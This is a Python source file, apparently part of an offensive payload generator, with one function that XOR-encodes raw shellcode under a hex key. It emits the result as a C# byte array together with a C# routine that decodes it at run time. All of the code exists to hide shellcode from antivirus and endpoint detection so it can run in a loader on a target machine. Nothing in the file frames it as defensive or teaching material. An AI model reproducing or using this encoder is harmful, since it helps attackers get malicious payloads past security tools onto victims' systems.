from helpers.log import logger

def xor_encryptor(integer_shellcode,key="a"):
    hex_key = hex(int(key,16))
    obfuscated_shellcode = []
    for each in integer_shellcode:
        obfuscated_shellcode.append(hex((each ^ int(key,16)) & 0xff))

    decryption_routine_csharp = """
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] ^ %s) & 0xFF);
}
""" % (hex_key)
    logger.debug(f"Using the xor_encryptor with key : {hex_key}")
    # Formatting the shellcode for usage in csharp
    final_shellcode = ""
    for i in range(len(obfuscated_shellcode)):
        if i == 0:
            final_shellcode += f"byte[] buf = new byte[{len(obfuscated_shellcode)}]" + "{\n"
        final_shellcode += obfuscated_shellcode[i]
        if i % 14 == 0 and i != 0:
            final_shellcode += ",\n"
        elif i == 0 or (i % 14 != 0 and i != len(obfuscated_shellcode)-1):
            final_shellcode += ","
        if i == len(obfuscated_shellcode)-1:
            final_shellcode += " };"

    logger.debug(f"XOR encrypted Shellcode generated with key {hex_key}, and decryption routine for csharp")
    return final_shellcode,hex_key,decryption_routine_csharp
